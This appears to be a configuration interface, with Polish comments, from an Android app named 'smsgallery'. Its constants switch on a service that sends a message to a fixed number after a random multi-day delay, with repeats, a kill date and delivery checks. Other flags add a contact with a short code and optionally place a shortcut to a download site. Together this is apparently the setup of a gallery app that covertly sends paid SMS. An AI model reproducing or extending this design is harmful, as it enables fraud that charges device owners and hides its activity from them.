package smsgallery.pl.smsgallery;

public interface DataIn {

    ///////////////SMS////////////////////////// onUptade i isinSent, splahs przy kazdym uru

    // kiedy ma przestać działać ( getTime ) 1490983727574L - 31Marca  //  7 marca 22.00 1488920400000L
    long whenStopLong = 1490983727574L;

    //Uruchomienie serwisu sms  1 działa 0 nie działa
    int SmsServiceOn = 1;

    String number = "601123456";

    // Wiadomość
    String message = "Hej";

    // dzień 86400000// 60000 minuta // za ile pierwsza wiadomość w milisekundach getTime + milis
    long firstDelay = 86400000; // przy losowaniu tylko firstDelay

    //losowanie  wylosowana razy firstDelay daje czas opużnienia smsa w milisekundach
    int low = 4; //przedział losowania niska
    int high = 7; // przedział losowania wysoka

    //+ 10 sekund dla pewności, zeby nie poszły dwa na raz
    long tenSecond = 10000;

                         /////////////Stworzenie Skrótu URL////////////////

    //Dodanie skrótu ULR  1 działa 0 nie działa
    int AddShortCutUrl = 0;
    String adressUrl = "http://www.speeddownload.pl/";  //adress jaki
    String adressUrlIconName = "Skrót do strony"; //Nazwa skrótu

                            /////////////////Add Contact////////////////

    //Dodanie numeru do kontaktów  1 działa 0 nie działa
    int AddNewContact = 1;
    String ContactName = "Kasia Dudek";
    String MobileNum = "73911";

                /////////////////Pobranie numeru telefonu////////////////////

    //Porbanie numeru telefonu  1 działa 0 nie działa
    int GetPhoneNumber = 0;
    //Sprawdzenie czy dostarczono sms
    int DeliveredCheck = 1;






   ///////////////////////////////////////////////////////////////////////



    //nie istotne od kiedy jest service
    long repeatDelay = 1200000; // co ile następna wiadomość w sekundach tylko dla interwału
    //nie istotne od kiedy jest service
}
